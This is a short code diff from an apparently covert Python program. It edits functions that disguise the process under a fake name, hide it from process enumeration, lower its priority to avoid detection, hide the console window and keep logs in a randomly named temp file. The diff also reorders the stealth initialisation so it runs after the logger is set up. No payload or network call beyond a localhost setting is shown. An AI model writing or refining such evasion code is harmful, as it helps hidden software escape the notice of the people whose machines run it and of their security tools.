@@ -43,10 +43,10 @@ def obfuscate_process():
         # Hide from basic process enumeration
         kernel32.SetProcessWorkingSetSize(current_process, -1, -1)
         
-        log.info(f"Process obfuscated as: {fake_name}")
+        print(f"🥷 Process obfuscated as: {fake_name}")  # Console output for initial feedback
         
     except Exception as e:
-        log.warning(f"Process obfuscation failed: {e}")
+        print(f"⚠️ Process obfuscation failed: {e}")
 
 def hide_from_detection():
     """Advanced hiding techniques"""
@@ -67,10 +67,10 @@ def hide_from_detection():
         # Reduce process priority to avoid detection
         kernel32.SetPriorityClass(current_process, 0x00000040)  # IDLE_PRIORITY_CLASS
         
-        log.info("Advanced hiding enabled")
+        print("🛡️ Advanced hiding enabled")
         
     except Exception as e:
-        log.warning(f"Advanced hiding failed: {e}")
+        print(f"⚠️ Advanced hiding failed: {e}")
 
 # -- Hide console window on Windows ------------------------------------------
 def hide_console():
@@ -84,10 +84,6 @@ def hide_console():
 
 hide_console()
 
-# Initialize stealth mode
-obfuscate_process()
-hide_from_detection()
-
 # -- Stealth logging (minimal footprint) -------------------------------------
 # Create logs in temp directory with random name
 temp_dir = Path(os.environ.get('TEMP', '/tmp'))
@@ -100,6 +96,10 @@ logging.basicConfig(
     filemode='w'
 )
 log = logging.getLogger(__name__)
+
+# Initialize stealth mode AFTER logger is setup
+obfuscate_process()
+hide_from_detection()
 
 # -- config -------------------------------------------------------------------
 HOST = "127.0.0.1"
